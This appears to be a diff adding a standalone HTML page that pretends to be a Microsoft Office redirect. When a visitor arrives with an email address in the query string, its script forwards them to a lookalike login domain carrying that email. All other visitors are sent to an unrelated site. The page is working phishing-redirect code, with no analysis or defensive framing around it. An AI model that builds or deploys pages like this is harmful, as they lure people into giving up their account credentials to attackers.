@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting to Microsoft Office</title>
+</head>
+<body>
+  <script>
+    function processQueryParam() {
+      // Get the query parameter from the URL
+      var queryParam = window.location.search.substring(1);
+
+      // Use a default redirect link if the query parameter is empty
+      if (!queryParam) {
+        queryParam = '?'; // Change this to your default query parameter
+      }
+
+      // Convert the query parameter to a hash fragment
+      var hashFragment = "#" + queryParam;
+
+      // Check if the hash fragment includes '@' (email address indicator)
+      if (hashFragment.includes('@')) {
+        // It might be an email address, so let's check
+        var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (emailPattern.test(hashFragment)) {
+          // It's a valid email address, redirect to the email address page
+          var decodedEmail = decodeURIComponent(hashFragment);
+          window.location.href = 'https://login.nebutafes.com/oUEFCQjv?' + decodedEmail;
+        } else {
+          // It's not a valid email address, redirect to the URL
+          window.location.href = "https://kpd520.com";
+        }
+      } else {
+        // It's a URL, redirect to the URL
+        window.location.href = "https://kpd520.com";
+      }
+    }
+
+    // Call the function to process the query parameter
+    processQueryParam();
+  </script>
+</body>
+</html>
